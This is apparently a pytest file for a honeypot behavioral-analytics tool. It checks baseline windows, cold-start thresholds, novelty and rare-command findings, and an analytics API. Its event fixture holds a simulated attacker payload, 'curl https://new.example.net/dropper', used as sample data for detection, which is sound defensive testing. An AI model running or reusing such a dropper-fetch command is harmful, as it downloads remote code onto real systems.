from datetime import datetime, timedelta, timezone

from aegis_nexus.app import create_app
from aegis_nexus.behavioral_analytics import BehavioralAnalytics
from aegis_nexus.model import normalize_event
from aegis_nexus.store import Store


ANCHOR = datetime(2026, 9, 26, 12, 0, tzinfo=timezone.utc)


def _event(ts, index, *, novel=False):
    source = "198.51.100.250" if novel else f"203.0.113.{(index % 10) + 1}"
    country = "DE" if novel else "IT"
    asn = "AS64599" if novel else "AS64500"
    username = "brand-new-user" if novel else f"user-{index % 4}"
    payload = "curl https://new.example.net/dropper" if novel else "echo baseline"
    iocs = (
        [
            {
                "type": "url",
                "value": "https://new.example.net/dropper",
                "classification": "observed_artifact",
                "evidence": ["observed.payload"],
            },
            {
                "type": "domain",
                "value": "new.example.net",
                "classification": "observed_artifact",
                "evidence": ["observed.payload"],
            },
        ]
        if novel else
        [{
            "type": "domain",
            "value": "baseline.example.org",
            "classification": "observed_artifact",
            "evidence": ["observed.payload"],
        }]
    )
    return normalize_event({
        "timestamp": ts.isoformat(),
        "honeypot": "web-1",
        "event_type": "credential",
        "observed": {
            "source_ip": source,
            "service": "http",
            "protocol": "tcp",
            "destination_port": 80,
            "credential": {"username": username, "password": "fixture-secret"},
            "payload": payload,
        },
        "enrichment": {
            "geo": {"source": "fixture", "observed_at": ts.isoformat(), "data": {"country": country}},
            "asn": {"source": "fixture", "observed_at": ts.isoformat(), "data": {"asn": asn}},
        },
        "derived": {"ioc": iocs},
    })


def _history():
    events = []
    for index in range(5):
        events.append(_event(ANCHOR - timedelta(hours=index + 1), index))
    for index in range(5, 15):
        events.append(_event(ANCHOR - timedelta(days=2, minutes=index), index))
    for index in range(15, 20):
        events.append(_event(ANCHOR - timedelta(days=10, minutes=index), index))
    return events


def test_baseline_framework_has_24h_7d_30d_windows_and_cold_start_thresholds():
    engine = BehavioralAnalytics(min_samples=20)
    current = _event(ANCHOR, 99, novel=True)
    result = engine.evaluate(current, _history())

    assert result["baseline_windows"]["24h"]["sample_count"] == 5
    assert result["baseline_windows"]["24h"]["ready"] is False
    assert result["baseline_windows"]["7d"]["sample_count"] == 15
    assert result["baseline_windows"]["7d"]["ready"] is False
    assert result["baseline_windows"]["30d"]["sample_count"] == 20
    assert result["baseline_windows"]["30d"]["ready"] is True
    assert result["policy"]["cold_start_suppresses_findings"] is True


def test_novelty_findings_cover_required_dimensions_and_explain_baseline():
    engine = BehavioralAnalytics(min_samples=20)
    current = _event(ANCHOR, 99, novel=True)
    result = engine.evaluate(current, _history())
    dimensions = {item["measurement"]["dimension"] for item in result["findings"]}

    assert {
        "source_ip",
        "country",
        "asn",
        "username",
        "payload_sha256",
        "url_domain",
    }.issubset(dimensions)
    for finding in result["findings"]:
        assert finding["classification"] == "derived_analytic"
        assert finding["attribution"] is False
        assert finding["baseline"]["window"] == "30d"
        assert finding["baseline"]["sample_count"] == 20
        assert finding["measurement"]["historical_occurrences"] == 0
        assert finding["evidence"][0]["type"] == "event"
        assert "not maliciousness or attribution" in finding["explanation"]


def test_cold_start_and_truncated_history_produce_no_novelty_findings():
    engine = BehavioralAnalytics(min_samples=20)
    current = _event(ANCHOR, 99, novel=True)
    assert engine.evaluate(current, _history()[:19])["findings"] == []
    result = engine.evaluate(current, _history(), truncated=True)
    assert result["findings"] == []
    assert result["history_truncated"] is True
    assert result["baseline_windows"]["30d"]["ready"] is False


def test_store_behavioral_context_excludes_anchor_and_is_timestamp_anchored(tmp_path):
    store = Store(str(tmp_path / "analytics.db"))
    for item in _history():
        store.ingest(item)
    saved = store.ingest(_event(ANCHOR, 99, novel=True))
    context = store.behavioral_context(saved)

    ids = {item["id"] for item in context["events"]}
    assert saved["id"] not in ids
    assert len(context["events"]) == 20
    assert context["analysis"]["anchor_event_id"] == saved["id"]
    assert context["analysis"]["scope"] == "historical_events_excluding_anchor"
    assert context["analysis"]["truncated"] is False


def test_event_analytics_api_returns_baseline_and_concrete_findings(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "api-analytics.db"),
        "ANALYTICS_MIN_SAMPLES": 20,
    })
    store = app.extensions["aegis_store"]
    for item in _history():
        store.ingest(item)
    saved = store.ingest(_event(ANCHOR, 99, novel=True))

    response = app.test_client().get(f"/api/v1/analytics/events/{saved['id']}")
    assert response.status_code == 200
    body = response.get_json()
    assert body["anchor_event_id"] == saved["id"]
    assert body["baseline_windows"]["30d"]["ready"] is True
    assert body["history"]["scope"] == "historical_events_excluding_anchor"
    assert any(item["analytic_id"] == "novel_source_ip" for item in body["findings"])



def test_rare_command_exposes_exact_30d_frequency_without_claiming_maliciousness():
    engine = BehavioralAnalytics(min_samples=20)
    history = _history()
    current = _event(ANCHOR, 99)
    current["observed"]["command"] = "uname -a"
    result = engine.evaluate(current, history)
    finding = next(item for item in result["findings"] if item["analytic_id"] == "rare_command")
    assert finding["measurement"]["historical_occurrences_30d"] == 0
    assert finding["measurement"]["rare_at_or_below"] == 1
    assert finding["baseline"]["sample_count"] == 20
    assert finding["attribution"] is False
    assert "not maliciousness or attribution" in finding["explanation"]


def test_command_frequency_spike_exposes_formula_measurement_and_evidence():
    engine = BehavioralAnalytics(min_samples=20)
    history = _history()
    for item in history[:5]:
        item["observed"]["command"] = "id"
    current = _event(ANCHOR, 99)
    current["observed"]["command"] = "id"
    result = engine.evaluate(current, history)
    finding = next(item for item in result["findings"] if item["analytic_id"] == "command_frequency_spike")
    assert finding["measurement"]["occurrences_24h"] == 6
    assert finding["measurement"]["daily_average_7d"] == round(5 / 7, 3)
    assert finding["measurement"]["threshold"] == 5
    assert finding["measurement"]["formula"] == "max(5, ceil(3 * seven_day_daily_average))"
    assert len(finding["evidence"]) == 6
